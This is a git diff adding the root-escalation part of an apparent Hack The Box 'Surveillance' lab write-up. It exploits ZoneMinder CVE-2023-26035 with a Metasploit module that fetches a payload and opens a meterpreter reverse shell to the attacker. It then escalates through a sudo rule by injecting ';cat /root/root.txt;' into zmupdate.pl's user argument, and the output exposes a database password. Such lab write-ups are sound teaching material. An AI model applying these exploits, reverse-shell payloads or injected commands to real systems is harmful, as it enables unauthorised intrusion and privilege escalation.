@@ -317,3 +317,192 @@ We can now read the user's flag:
 matthew@surveillance:~$ cat user.txt 
 2e68************************7a6c
 ```
+
+## Root privileges escalation
+
+### Exploiting Zoneminder
+
+The machine is not rooted yet, as there is enigmatic user `zoneminder`. First thing to check is allowed commands with `sudo`:
+
+```bash
+matthew@surveillance:~$ sudo -l
+[sudo] password for matthew:                                                                                         
+Sorry, user matthew may not run sudo on surveillance.
+```
+
+This attempt was not successful, moving next I've focused on gaining more info about the environment. To explore more about the machine I've used the `linpeas` enumerating script, which discovered port `8080` in internal use:
+
+![image](https://github.com/amalcew/htb-writeups/assets/73908014/7bac16fc-1105-45ee-a0dc-04742f04c30c)
+
+To access the service it is required to forward local ports using `ssh`:
+
+```bash
+> ssh -L 8080:localhost:8080 matthew@10.10.11.245
+matthew@10.10.11.245's password: 
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)
+
+...SNIP...
+```
+
+Now we can access the hidden website in the browser:
+
+![05-hidden_webpage](https://github.com/amalcew/htb-writeups/assets/73908014/145d7381-bba4-4785-9ba4-800b543fbec4)
+
+So that's why there is a second standard user `zoneminder`! This is obviously the next step in the privileges escalation we should take.
+
+The `linpeas` report dumped also some credentials to database used by the website:
+
+![Screenshot_2024-04-11_23-48-51](https://github.com/amalcew/htb-writeups/assets/73908014/854bdf1b-da00-469e-aaf7-4cb2aa191064)
+
+but sadly our curent user cannot perform any commands to access the db. As we have no credentials to the panel, we need to dig deeper.
+
+After some searching, I've found the `config.php` file of the Zoneminder, that revealed the version of the service:
+
+```bash
+matthew@surveillance:/usr/share/zoneminder/www/includes$ cat config.php | grep VERSION
+define( 'ZM_VERSION', '1.36.32' );               // Version
+```
+
+Quick Google search revealed, that this versoin is vulnerable to [CVE-2023-26035](https://nvd.nist.gov/vuln/detail/CVE-2023-26035), which affects the snapshot action of the service. There is neat metasploit exploit, that we will use during escalation:
+
+```bash
+msf6 exploit(unix/webapp/zoneminder_snapshots) > show options
+
+Module options (exploit/unix/webapp/zoneminder_snapshots):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     127.0.0.1        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit
+                                         /basics/using-metasploit.html
+   RPORT      8080             yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI  /                yes       The ZoneMinder path
+   URIPATH    /                no        The URI to use for this exploit (default is random)
+   VHOST                       no        HTTP server virtual host
+
+
+   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address o
+                                       n the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+
+
+Payload options (cmd/linux/http/x64/meterpreter/reverse_tcp):
+
+   Name                Current Setting  Required  Description
+   ----                ---------------  --------  -----------
+   FETCH_COMMAND       CURL             yes       Command to fetch payload (Accepted: CURL, FTP, TFTP, TNFTP, WGET
+                                                  )
+   FETCH_DELETE        false            yes       Attempt to delete the binary after execution
+   FETCH_FILENAME      zCaBjCTwPNZ      no        Name to use on remote system when storing payload; cannot contai
+                                                  n spaces or slashes
+   FETCH_SRVHOST                        no        Local IP to use for serving payload
+   FETCH_SRVPORT       8080             yes       Local port to use for serving payload
+   FETCH_URIPATH                        no        Local URI to use for serving payload
+   FETCH_WRITABLE_DIR  /tmp             yes       Remote writable dir to store payload; cannot contain spaces
+   LHOST               xx.xx.xx.xx      yes       The listen address (an interface may be specified)
+   LPORT               4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   nix Command
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(unix/webapp/zoneminder_snapshots) > exploit
+
+[*] Started reverse TCP handler on xx.xx.xx.xx:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[*] Elapsed time: 18.276545536999947 seconds.
+[+] The target is vulnerable.
+[*] Fetching CSRF Token
+[+] Got Token: key:f06ff060f84e8b20b7d6bd3a4ee34a3479428d47,1712871056
+[*] Executing nix Command for cmd/linux/http/x64/meterpreter/reverse_tcp
+[*] Sending payload
+[*] Sending stage (3045380 bytes) to 10.10.11.245
+[*] Meterpreter session 1 opened (xx.xx.xx.xx:4444 -> 10.10.11.245:44972) at 2024-04-11 23:30:55 +0200
+[+] Payload sent
+
+meterpreter > shell
+Process 48175 created.
+Channel 1 created.
+id
+uid=1001(zoneminder) gid=1001(zoneminder) groups=1001(zoneminder)
+```
+
+After some shell stabilization, we are ready to target the root account.
+
+### Exploiting service scripts
+
+This time when checking the allowed commands with `sudo` privilege, there are some very interesting result:
+
+```bash
+zoneminder@surveillance:/usr/share/zoneminder/www$ sudo -l
+sudo -l
+Matching Defaults entries for zoneminder on surveillance:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User zoneminder may run the following commands on surveillance:
+    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
+```
+
+Moving to the suggested directory, we can find some Zoneminder service scripts, that we can use to gain access over root:
+
+```bash
+zoneminder@surveillance:/usr/bin$ ls -al | grep zm | grep .pl
+ls -al | grep zm | grep .pl
+-rwxr-xr-x  1 root root       43027 Nov 23  2022 zmaudit.pl
+-rwxr-xr-x  1 root root       12939 Nov 23  2022 zmcamtool.pl
+-rwxr-xr-x  1 root root        6043 Nov 23  2022 zmcontrol.pl
+-rwxr-xr-x  1 root root       26232 Nov 23  2022 zmdc.pl
+-rwxr-xr-x  1 root root       35206 Nov 23  2022 zmfilter.pl
+-rwxr-xr-x  1 root root        5640 Nov 23  2022 zmonvif-probe.pl
+-rwxr-xr-x  1 root root       19386 Nov 23  2022 zmonvif-trigger.pl
+-rwxr-xr-x  1 root root       13994 Nov 23  2022 zmpkg.pl
+-rwxr-xr-x  1 root root       17492 Nov 23  2022 zmrecover.pl
+-rwxr-xr-x  1 root root        4815 Nov 23  2022 zmstats.pl
+-rwxr-xr-x  1 root root        2133 Nov 23  2022 zmsystemctl.pl
+-rwxr-xr-x  1 root root       13111 Nov 23  2022 zmtelemetry.pl
+-rwxr-xr-x  1 root root        5340 Nov 23  2022 zmtrack.pl
+-rwxr-xr-x  1 root root       18482 Nov 23  2022 zmtrigger.pl
+-rwxr-xr-x  1 root root       45421 Nov 23  2022 zmupdate.pl
+-rwxr-xr-x  1 root root        8205 Nov 23  2022 zmvideo.pl
+-rwxr-xr-x  1 root root        7022 Nov 23  2022 zmwatch.pl
+-rwxr-xr-x  1 root root       19655 Nov 23  2022 zmx10.pl
+```
+
+The most useful script is `zmupdate.pl` as it is used to update Zoneminder database and takes database credentials discovered previously. After some research and tinkering on the [source](https://github.com/ZoneMinder/ZoneMinder/blob/master/scripts/zmupdate.pl.in) of the script I've managed to use the script and command injection on user parameter, I've been able to read the root flag:
+
+```bash
+zoneminder@surveillance:/usr/bin$ sudo ./zmupdate.pl -v 1.36.31 -u ';cat /root/root.txt;'
+sudo ./zmupdate.pl -v 1.36.31 -u ';cat /root/root.txt;'
+
+Initiating database upgrade to version 1.36.32 from version 1.36.31
+
+WARNING - You have specified an upgrade from version 1.36.31 but the database version found is 1.36.32. Is this correct?
+Press enter to continue or ctrl-C to abort : 
+
+
+Do you wish to take a backup of your database prior to upgrading?
+This may result in a large file in /tmp/zm if you have a lot of events.
+Press 'y' for a backup or 'n' to continue : y
+y
+Creating backup to /tmp/zm/zm-1.36.31.dump. This may take several minutes.
+mysqldump: option '-u' requires an argument
+sh: 1: -pZoneMinderPassword2023: not found
+Output: 1726************************089c
+Command 'mysqldump -u;cat /root/root.txt; -p'ZoneMinderPassword2023' -hlocalhost --add-drop-table --databases zm > /tmp/zm/zm-1.36.31.dump' exited with status: 127
+zoneminder@surveillance:/usr/bin$ 
+```
